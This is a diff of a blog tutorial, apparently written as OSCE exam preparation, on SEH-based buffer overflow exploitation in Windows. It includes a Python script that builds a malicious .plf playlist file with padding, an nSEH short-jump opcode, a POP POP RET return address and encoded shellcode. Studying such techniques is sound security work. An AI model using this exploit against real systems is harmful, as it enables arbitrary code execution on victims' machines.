@@ -16,7 +16,6 @@ tags:
   - osce
   - assembly
 ---
-# THIS IS A DRAFT
 
 ![omg](/assets/images/seh/lich_boi.jpg)
 
@@ -32,12 +31,10 @@ In simple terms, an Exception Handler is exactly as the name implies, it *handle
 
 The program then needs to know how to *handle* this, either with an error message, exit code, or whatever else.
 
-A Structured Exception Handler will follow a structure in  regards to handling exceptions.
-
 For every exception handler, there is an Exception Registration Record structure.
 These structures are chained together to create a "linked list" (a linked list contains a sequence of data records).
 
-When an exception is triggered the OS scans down this list to evaluate the other exception functions until it finds a suitable exception handler for the current exception. (If no error is found, windows places a generic handler at the end to ensure it wil be handled in some manner).
+When an exception is triggered the OS scans down the linked list to evaluate the other exception functions until it finds a suitable exception handler for the current exception. (If no error is found, windows places a generic handler at the end to ensure it wil be handled in some manner).
 
 We can overwrite the SEH address with an overflow, and thus control it.
 
@@ -121,6 +118,8 @@ Now you may have guessed something based of the below sequence, that's right! if
 
 So now we need to replace nSEH with opcode that will JMP over the next few bytes of space. A safe amount would be 10, and pad the beginning of shellcode with NOPS.
 
+The opcode for JMP is `EB`, so nSEH would be `\xeb\x0a\x90\x90`
+
 ![SEH_overwrite](/assets/images/seh/SEH_overwrite.jpg)
 
 ![SEH_break_ppr2](/assets/images/seh/SEH_break_ppr2.jpg)
@@ -153,10 +152,10 @@ shellcode="\x90"*10+("\xd9\xc2\xd9\x74\x24\xf4\xba\x75\xad\xc8\xb1\x58\x33\xc9\x
 "\xf9\x32\xe9\x56\x82\x2e\x89\x99\x59\xeb\xb9\xd3\xc3\x5a\x52"
 "\xba\x96\xde\x3f\x3d\x4d\x1c\x46\xbe\x67\xdd\xbd\xde\x02\xd8"
 "\xfa\x58\xff\x90\x93\x0c\xff\x07\x93\x04")
-
+nSEH="\xeb\x0A\x90\x90" # opcode to jump back over SEH to avoid loop and enter shellcode
+SEH="\x57\xe5\x62\x61" # adress of non SEH protected module containing POP POP RET
 filename="seh.plf"
-#0x6162e557
-buffer = "A"*608 + "\xeb\x10\x90\x90" + "\x57\xe5\x62\x61" + shellcode+ "B"*(1384-len(shellcode))
+buffer = "A"*608 + nSEH + SEH + shellcode+ "B"*(1384-len(shellcode))
 textfile = open(filename , 'w')
 textfile.write(buffer)
 textfile.close()
@@ -175,8 +174,4 @@ So the takeaways for exploiting SEH are:
 * Use SEH to move up 8 to nSEH
 * Use nSEH to Jump back over SEH and into shellcode
 
-
-#### I hope as an aspiring OSCE/security researcher you found this informative and above else *helpful* - I will be following this up with at least an article on ASLR.
-
-
-# THIS IS A DRAFT
+#### This is my first article in a series to help myself/others prepare for CTP and continue quest for big brain.
